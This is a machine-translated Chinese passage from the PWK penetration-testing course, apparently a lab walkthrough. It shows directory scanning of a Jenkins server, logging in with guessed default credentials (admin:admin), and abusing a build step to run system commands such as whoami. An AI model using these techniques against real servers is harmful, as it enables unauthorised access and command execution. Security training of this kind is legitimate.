<div style="position:absolute;top:20494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.1.1.2</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对 DOM 的审查不会揭示任何新信息。</font><font style="vertical-align: inherit;">我们可以看到页面是一个基本的</font></font></nobr></div>
<div style="position:absolute;top:20534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTML 表单。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:21072;left:388"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 357：Jenkins DOM</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将查看源代码，看看它是否揭示了任何新内容。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:21559;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="19"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 19 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:21592;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:22669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:22669;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:22669;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">828</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:21682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.1.1.3</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们右键单击页面上的任意位置并选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">View Source</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:22241;left:382"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 358：Jenkins 源</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:22272;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然 Javascript 有可能改变 DOM，导致 DOM 和源不同，</font></font></nobr></div>
<div style="position:absolute;top:22291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这里似乎并非如此。</font><font style="vertical-align: inherit;">源代码和 DOM 非常相似。</font></font></nobr></div>
<div style="position:absolute;top:22324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将运行基本的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dirb</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描以发现任何潜在的隐藏文件。</font><font style="vertical-align: inherit;">詹金斯将回应</font></font></nobr></div>
<div style="position:absolute;top:22343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于未登录时我们尝试访问的任何文件，都会出现 403，因此我们将使用</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:22363;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-w</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志以继续扫描警告消息。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:22398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">proxychains dirb http://10.5.5.25:8080/ -w</font></font></font></b></nobr></div>
<div style="position:absolute;top:22415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:22432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">URL_BASE：http://10.5.5.25:8080/</font></font></nobr></div>
<div style="position:absolute;top:22449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WORDLIST_FILES：/usr/share/dirb/wordlists/common.txt</font></font></nobr></div>
<div style="position:absolute;top:22465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：不停止警告消息</font></font></nobr></div>
<div style="position:absolute;top:22500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------------</font></font></nobr></div>
<div style="position:absolute;top:22534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成的单词：4612    </font></font></nobr></div>
<div style="position:absolute;top:22567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- 扫描网址：http://10.5.5.25:8080/ ----</font></font></nobr></div>
<div style="position:absolute;top:22584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.25:8080-&lt;&gt;&lt;&gt;-OK</font></font></nobr></div>
<div style="position:absolute;top:22602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(!) 警告：此目录的所有响应似乎都是 CODE = 403。</font></font></nobr></div>
<div style="position:absolute;top:22618;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（如果你想扫描它，请使用模式“-w”） </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:22747;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="20"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 20 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:22780;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:23857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:23857;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:23857;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">829</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:22876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://10.5.5.25:8080/error (CODE:400|SIZE:6082)</font></font></nobr></div>
<div style="position:absolute;top:22892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://10.5.5.25:8080/favicon.ico (CODE:200|SIZE:17542)</font></font></nobr></div>
<div style="position:absolute;top:22909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(!) 警告：此目录的所有响应似乎都是 CODE = 403。</font></font></nobr></div>
<div style="position:absolute;top:22926;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（如果你想扫描它，请使用模式“-w”）</font></font></nobr></div>
<div style="position:absolute;top:22944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:22960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://10.5.5.25:8080/login (CODE:200|SIZE:1942)</font></font></nobr></div>
<div style="position:absolute;top:22977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://10.5.5.25:8080/logout (CODE:500|SIZE:14235)</font></font></nobr></div>
<div style="position:absolute;top:22994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(!) 警告：此目录的所有响应似乎都是 CODE = 403。</font></font></nobr></div>
<div style="position:absolute;top:23011;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（如果你想扫描它，请使用模式“-w”）</font></font></nobr></div>
<div style="position:absolute;top:23028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:23045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://10.5.5.25:8080/robots.txt (CODE:200|SIZE:71)</font></font></nobr></div>
<div style="position:absolute;top:23062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:23096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- 进入目录：http://10.5.5.25:8080/assets/ ----</font></font></nobr></div>
<div style="position:absolute;top:23130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------------</font></font></nobr></div>
<div style="position:absolute;top:23147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">END_TIME：2019 年 12 月 12 日星期四 10:16:39</font></font></nobr></div>
<div style="position:absolute;top:23164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载：9224 - 找到：5</font></font></nobr></div>
<div style="position:absolute;top:23183;left:364"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 985 - Jenkins 的 Dirb 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:23213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的扫描发现了一些端点，但没有任何价值。</font></font></nobr></div>
<div style="position:absolute;top:23246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，让我们做一些我们的黑客直觉一直在耳语让我们尝试的事情。</font><font style="vertical-align: inherit;">让我们进入</font></font></nobr></div>
<div style="position:absolute;top:23265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭据</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">admin:password</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">admin:admin</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">弱密码配置很常见</font></font></nobr></div>
<div style="position:absolute;top:23284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在内部网络中，因为只有“受信任的”用户才能访问服务器。</font></font></nobr></div>
<div style="position:absolute;top:23317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，尝试几个密码组合很少会触发任何警报，因为它是</font></font></nobr></div>
<div style="position:absolute;top:23337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">普通用户偶尔会错误地输入密码的典型情况。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:23935;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="21"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 21 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:23968;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:25045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:25045;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:25045;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">830</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:24569;left:359"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 359：admin:password 失败 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:25123;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="22"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 22 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:25156;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:26233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:26233;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:26233;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">831</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:25246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.1.1.4</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:25267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭据 admin:password 失败。</font><font style="vertical-align: inherit;">接下来，我们将尝试 admin:admin。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:25805;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 360：admin:admin 成功</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:25836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">admin:admin 凭据有效！</font><font style="vertical-align: inherit;">接下来，我们需要想办法利用Jenkins获得一个</font></font></nobr></div>
<div style="position:absolute;top:25855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">壳。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:25890;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.2</font></font></i></nobr></div>
<div style="position:absolute;top:25890;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用詹金斯</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:25928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查阅 Jenkins 文档</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">747</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">足以了解如何创建一个允许</font></font></nobr></div>
<div style="position:absolute;top:25947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们来执行系统命令。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:26183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">747 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（詹金斯维基，2017 年），https://wiki.jenkins.io/display/JENKINS/Configure+the+Job</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:26311;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="23"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 23 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:26344;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:27421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:27421;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:27421;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">832</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:26434;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.2.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:26455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将选择</font><font style="vertical-align: inherit;">左上角</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">New Item</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链接来创建一个新项目。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:26993;left:370"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 361：选择新项目 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:27499;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="24"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 24 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:27532;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:28609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:28609;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:28609;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">833</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:27622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.2.1.2</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:27643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当新的项目页面打开时，我们会给项目一个非恶意的名字，比如“访问”，</font></font></nobr></div>
<div style="position:absolute;top:27662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Freestyle 项目</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，然后单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确定</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:28032;left:372"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 362：创建新项目</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:28063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要让 Jenkins 执行系统命令，我们可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Build</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置部分。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:28687;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="25"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 25 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:28720;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:29797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:29797;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:29797;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">834</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:28810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.2.1.3</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:28831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加构建步骤</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并从下拉列表中选择“执行 Windows 批处理命令”。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:29369;left:293"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 363：选择“执行 Windows 批处理命令” </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:29875;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="26"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 26 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:29908;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:30985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:30985;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:30985;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">835</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:29998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.2.1.4</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文本框出现时，我们将输入“whoami”。</font><font style="vertical-align: inherit;">这将在以后更改为其他</font></font></nobr></div>
<div style="position:absolute;top:30038;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们希望执行的命令。</font><font style="vertical-align: inherit;">当在文本框中输入命令时，</font><font style="vertical-align: inherit;">我们将单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:30329;left:316"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 364：为批处理命令编写“whoami”</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jenkins 随后将打开该项目的主页。</font><font style="vertical-align: inherit;">从这里，我们可以选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Build Now</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来运行</font></font></nobr></div>
<div style="position:absolute;top:30379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:30783;left:371"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 365：建筑命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30815;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行构建时，将在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Build History</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下显示一个新项目</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:31063;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="27"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 27 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:31096;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:32173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:32173;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:32173;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">836</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:31186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.2.1.5</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:31207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单击“#1”将打开构建页面。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:31868;left:351"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 366：Whoami 构建完成 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:32251;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="28"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 28 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:32284;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:33361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:33361;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:33361;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">837</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:32374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.2.1.6</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:32395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在构建页面中，我们可以选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Console Output</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来查看我们命令的输出。</font></font></nobr></div>
